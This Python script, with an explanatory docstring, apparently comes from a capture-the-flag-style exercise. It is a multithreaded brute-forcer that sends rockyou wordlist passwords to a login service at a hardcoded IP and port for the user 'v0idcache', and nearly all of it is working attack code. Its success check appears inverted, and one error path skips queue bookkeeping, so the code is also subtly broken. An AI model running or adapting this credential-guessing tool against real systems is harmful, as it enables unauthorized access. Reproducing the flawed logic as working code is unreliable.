"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""
#!/usr/bin/env python3

import socket
import struct

import threading
from multiprocessing import Queue
import sys

try: 
    import queue
except ImportError:
    import Queue as queue

username = "v0idcache"

# wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
# wordlist = "D:/Tools/rockyou.txt"
wordlist = "rockyou_short.txt"
passwordList = open(wordlist, 'r', encoding="utf8").read().splitlines()

host = "142.93.136.81"  # IP address here
port = 1337  # Port here


class WorkerThread(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):
        while True:
            password = None
 
            try:
                password = self.queue.get(timeout=1)
 
            except queue.Empty:
                return

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.recv(1024)

                # username
                usr_len = len(username + "\n")
                pack_len = str(usr_len) + "s"
                # pack username with newline character appended
                payload = struct.pack(pack_len, (username + "\n").encode("utf-8"))
                print(payload)
                s.send(payload)

                # password
                pass_len = len(password)
                pack_len = str(pass_len) + "s"

                try:
                    password.encode("ascii")
                except UnicodeEncodeError:
                    print("Non ascii password detected")
                    continue

                # pack password
                payload = struct.pack(pack_len, (password).encode("utf-8"))
                print(payload)
                s.send(payload)
                data = s.recv(1024)

                if 'Fail' not in data.decode():
                        s.close()
                        print("Failed " + username + "/" + password)
                else:
                        print("[+] Successful Login! Username: " + username + " Password: " + password)
                        sys.exit()
            except :
                raise 
 
            self.queue.task_done()
 
queue = queue.Queue()

print("starting")
threads = []
for i in range(1, 40) : # Number of threads
    worker = WorkerThread(queue, i) 
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)
 
for password in passwordList :
    queue.put(password)     # Push usernames onto queue
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
    item.join()
 
print("Testing Complete!")